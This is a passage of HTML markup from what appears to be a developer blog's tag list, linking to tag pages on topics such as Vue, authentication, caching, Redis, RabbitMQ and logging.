rel="tag">Authentication</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Authorization/" rel="tag">Authorization</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Axios/" rel="tag">Axios</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cache/" rel="tag">Cache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cache-Invalidation/" rel="tag">Cache Invalidation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Clean-Architecture/" rel="tag">Clean Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Composable/" rel="tag">Composable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Composition-Api/" rel="tag">Composition Api</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cron/" rel="tag">Cron</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Debug/" rel="tag">Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Debugger/" rel="tag">Debugger</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Design-Pattern/" rel="tag">Design Pattern</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DistributedSystem/" rel="tag">DistributedSystem</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DotNet/" rel="tag">DotNet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELK/" rel="tag">ELK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ESLint/" rel="tag">ESLint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Elasticsearch/" rel="tag">Elasticsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Enum/" rel="tag">Enum</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Error-Handling/" rel="tag">Error Handling</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EventSPI/" rel="tag">EventSPI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Feature-Flag/" rel="tag">Feature Flag</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fetch/" rel="tag">Fetch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Frontend-Architecture/" rel="tag">Frontend Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GitFlow/" rel="tag">GitFlow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Gzip/" rel="tag">Gzip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hangfire/" rel="tag">Hangfire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Incident/" rel="tag">Incident</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Interceptor/" rel="tag">Interceptor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kibana/" rel="tag">Kibana</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LazyCache/" rel="tag">LazyCache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Logging/" rel="tag">Logging</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Login-Flow/" rel="tag">Login Flow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MFA/" rel="tag">MFA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MessageHub/" rel="tag">MessageHub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Micro-Frontend/" rel="tag">Micro Frontend</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MobileApp/" rel="tag">MobileApp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MongoDB/" rel="tag">MongoDB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Monitoring/" rel="tag">Monitoring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Native-Bridge/" rel="tag">Native Bridge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nuxt3/" rel="tag">Nuxt3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Performance/" rel="tag">Performance</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pinia/" rel="tag">Pinia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pre-Commit/" rel="tag">Pre-Commit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Prerender/" rel="tag">Prerender</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QA-Testing/" rel="tag">QA Testing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Queue/" rel="tag">Queue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RabbitMQ/" rel="tag">RabbitMQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rate-Limiting/" rel="tag">Rate Limiting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RateLimit/" rel="tag">RateLimit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Recording/" rel="tag">Recording</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Responsible-Gambling/" rel="tag">Responsible Gambling</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Revert/" rel="tag">Revert</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RouteConstraint/" rel="tag">RouteConstraint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEO/" rel="tag">SEO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSO/" rel="tag">SSO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Safari/" rel="tag">Safari</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/" rel="tag">Security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SessionStorage/" rel="tag">SessionStorage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tailwind-CSS/" rel="tag">Tailwind CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TypeScript/" rel="tag">TypeScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vite/" rel="tag">Vite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-Life-Cycle/" rel="tag">Vue Life Cycle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-Router/" rel="tag">Vue Router</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-js/" rel="tag">Vue.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue3/" rel="tag">Vue3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-API/" rel="tag">Web API</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Debug/" rel="tag">Web Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WebView/" rel="tag">WebView</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Webpack/" rel="tag">Webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Workflow/" rel="tag">Workflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iOS/" rel="tag">iOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/v-html/" rel="tag">v-html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%A7%8B/" rel="tag">前端架構</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BA%AB%E4%BB%BD%E9%A9%97%E8%AD%89/" rel="tag">身份驗證</a></li></ul>
     </div>
   </div>
 
